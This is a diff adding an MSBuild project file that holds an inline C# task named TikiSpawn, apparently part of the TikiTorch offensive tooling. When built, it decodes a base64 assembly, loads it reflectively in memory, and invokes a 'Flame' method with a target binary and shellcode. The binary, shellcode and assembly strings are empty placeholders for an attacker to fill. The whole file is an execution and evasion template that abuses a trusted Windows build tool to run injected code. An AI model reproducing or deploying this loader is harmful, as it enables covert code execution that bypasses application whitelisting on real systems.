@@ -1,0 +1,47 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="TikiTorch">
+    <TikiSpawn />
+  </Target>
+  <UsingTask
+    TaskName="TikiSpawn"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+    
+      <Code Type="Class" Language="cs">
+      <![CDATA[
+
+          using System;
+          using System.Reflection;
+          using System.Runtime.InteropServices;
+          using Microsoft.Build.Framework;
+          using Microsoft.Build.Utilities;
+
+          public class TikiSpawn : Task, ITask
+          {
+            public const string binary = @"";
+            public const string shellcode = "";
+            public const string dll = "";
+
+            public override bool Execute()
+            {
+              Assembly TikiSpawn = Assembly.Load(Convert.FromBase64String(dll));
+
+              Type type = TikiSpawn.GetType("TikiSpawn");
+              object instance = Activator.CreateInstance(type);
+
+              type.InvokeMember("Flame",
+                BindingFlags.InvokeMethod | BindingFlags.Static | BindingFlags.Public,
+                null,
+                instance,
+                new object[] { binary, shellcode });
+
+              return true;
+            }
+          }
+
+      ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
